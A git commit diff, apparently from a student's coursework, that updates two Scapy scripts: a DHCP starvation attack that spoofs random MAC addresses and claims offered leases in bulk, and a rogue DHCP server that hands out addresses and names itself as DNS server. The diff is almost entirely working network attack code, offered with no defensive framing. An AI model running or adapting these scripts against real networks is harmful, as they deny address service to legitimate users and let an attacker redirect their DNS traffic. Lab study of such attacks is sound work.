82c36c5189415453cb19461c2b72c2f5ae291f5e
suriya1201 <2001375A@student.tp.edu.sg>
2024-06-10 12:42:51 +0800

    updates

--- DHCP_exhaustion.py
+++ DHCP_exhaustion.py
@@ -1,40 +1,65 @@
 from scapy.all import *
-from scapy.layers.dhcp import *
-from scapy.layers.inet import UDP, IP
-from scapy.layers.l2 import Ether
 import random
+import threading
 import time
 
-def generate_mac():
-    """Generate a random MAC address."""
-    return "02:00:00:%02x:%02x:%02x" % (
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255),
-    )
+class DHCPClient:
+    def __init__(self, iface):
+        self.iface = iface
+        self.mac = self.get_random_mac()
+        self.transaction_id = random.randint(1, 900000000)
 
-def send_dhcp_discover():
-    """Send a DHCP Discover packet."""
-    mac = generate_mac()
-    dhcp_discover = (
-        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-        IP(src="0.0.0.0", dst="255.255.255.255") /
-        UDP(sport=68, dport=67) /
-        BOOTP(chaddr=[mac2str(mac)], xid=random.randint(0, 0xFFFFFFFF)) /
-        DHCP(options=[("message-type", "discover"), "end"])
-    )
-    sendp(dhcp_discover, verbose=0, iface="Ethernet")
+    def get_random_mac(self):
+        return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
 
-def main():
-    """Main function to send multiple DHCP Discover packets."""
-    print("Starting DHCP starvation attack...")
-    try:
-        while True:
-            send_dhcp_discover()
-            time.sleep(0.1)  # Add a delay to avoid overwhelming the network
-    except KeyboardInterrupt:
-        print("Attack stopped.")
+    def send_dhcp_discover(self):
+        discover = (
+            Ether(src=self.mac, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src="0.0.0.0", dst="255.255.255.255") /
+            UDP(sport=68, dport=67) /
+            BOOTP(chaddr=[mac2str(self.mac)], xid=self.transaction_id) /
+            DHCP(options=[("message-type", "discover"), "end"])
+        )
+        sendp(discover, iface=self.iface, verbose=0)
+
+    def handle_dhcp_offer(self, pkt):
+        if DHCP in pkt and pkt[DHCP].options[0][1] == 2:
+            offered_ip = pkt[BOOTP].yiaddr
+            server_ip = pkt[IP].src
+            self.send_dhcp_request(offered_ip, server_ip)
+
+    def send_dhcp_request(self, requested_ip, server_ip):
+        request = (
+            Ether(src=self.mac, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src="0.0.0.0", dst="255.255.255.255") /
+            UDP(sport=68, dport=67) /
+            BOOTP(chaddr=[mac2str(self.mac)], xid=self.transaction_id) /
+            DHCP(options=[("message-type", "request"),
+                          ("requested_addr", requested_ip),
+                          ("server_id", server_ip),
+                          "end"])
+        )
+        sendp(request, iface=self.iface, verbose=0)
+
+    def start(self):
+        self.send_dhcp_discover()
+
+def handle_packet(pkt):
+    if DHCP in pkt and pkt[DHCP].options[0][1] == 2:  # DHCP Offer
+        client = DHCPClient(iface="Ethernet")
+        client.handle_dhcp_offer(pkt)
+
+def start_clients(num_clients, iface):
+    for _ in range(num_clients):
+        client = DHCPClient(iface)
+        client.start()
+        time.sleep(1)  # Slight delay to avoid flooding
 
 if __name__ == "__main__":
+    iface = "Ethernet"
+    num_clients = 100  # Number of clients to simulate
 
-    main()
+    sniff_thread = threading.Thread(target=sniff, kwargs={"filter": "udp and (port 67 or 68)", "prn": handle_packet, "store": 0, "iface": iface})
+    sniff_thread.start()
+
+    start_clients(num_clients, iface)
--- ROGUE_DHCP.py
+++ ROGUE_DHCP.py
@@ -4,13 +4,13 @@ from scapy.layers.inet import UDP, IP
 from scapy.layers.l2 import Ether
 
 # Define the DHCP server configuration
-server_ip = '192.168.1.19'
+server_ip = '192.168.1.9'
 subnet_mask = '255.255.255.240'
 lease_time = 86400  # Lease time in seconds
 Renewal_Time = 43200
 rebinding_time_value = 75600
-ip_pool = [ '192.168.1.20', '192.168.1.21']  # Example IP pool
-dns_server = "192.168.1.19"
+ip_pool = [ '192.168.1.2','192.168.1.3', '192.168.1.4', '192.168.1.10', '192.168.1.11', '192.168.1.20' ]  # Example IP pool
+dns_server = "192.168.1.9"
 offered_ips = {}
 def handle_dhcp_packet(packet):
     if packet[DHCP] and packet[DHCP].options[0][1] == 1:  # DHCP Discover
@@ -28,16 +28,15 @@ def handle_dhcp_packet(packet):
 def send_dhcp_offer(discover_packet, offer_ip):
     transaction_id = discover_packet[BOOTP].xid
     offer_packet = Ether(src="D0:5F:64:35:A7:3C", dst=discover_packet[Ether].src) / \
-                   IP(src=server_ip, dst="255.255.255.255") / \
+                   IP(src=server_ip, dst=offer_ip) / \
                    UDP(sport=67, dport=68) / \
-                   BOOTP(op=2,xid=transaction_id, yiaddr=offer_ip, siaddr=server_ip, chaddr=discover_packet[Ether].chaddr) / \
+                   BOOTP(op=2,xid=transaction_id, yiaddr=offer_ip, chaddr=discover_packet[Ether].chaddr) / \
                     DHCP(options=[('message-type', 'offer'),
                                  ('server_id', server_ip),
                                  ('lease_time', lease_time),
                                  ('renewal_time', Renewal_Time),
                                  ('rebinding_time', rebinding_time_value),
                                  ('subnet_mask', subnet_mask),
-                                 ('router', server_ip),
                                  ('name_server', dns_server),
                                  ('end')])
     sendp(offer_packet, iface="Ethernet", verbose=False)
@@ -45,19 +44,20 @@ def send_dhcp_offer(discover_packet, offer_ip):
 def send_dhcp_ack(request_packet, assigned_ip):
     transaction_id = request_packet[BOOTP].xid
     ack_packet = Ether(src="D0:5F:64:35:A7:3C", dst=request_packet[Ether].src) / \
-                 IP(src=server_ip, dst='255.255.255.255') / \
+                 IP(src=server_ip, dst=assigned_ip) / \
                  UDP(sport=67, dport=68) / \
-                 BOOTP(op=2,xid=transaction_id, yiaddr=assigned_ip, siaddr=server_ip, chaddr=request_packet[Ether].chaddr) / \
+                 BOOTP(op=2,xid=transaction_id, yiaddr=assigned_ip, chaddr=request_packet[Ether].chaddr) / \
                  DHCP(options=[('message-type', 'ack'),
                                ('server_id', server_ip),
                                  ('lease_time', lease_time),
                                  ('renewal_time', Renewal_Time),
                                  ('rebinding_time', rebinding_time_value),
                                  ('subnet_mask', subnet_mask),
-                                 ('router', server_ip),
                                  ('name_server', dns_server),
                                  ('end')])
-    sendp(ack_packet, iface="Ethernet")
+                            
+   
+    sendp(ack_packet, iface="Ethernet",verbose=False)
 
 print("DHCP Server is running...")
 sniff(filter="udp and (port 67 or 68) ", prn=handle_dhcp_packet, iface="Ethernet")
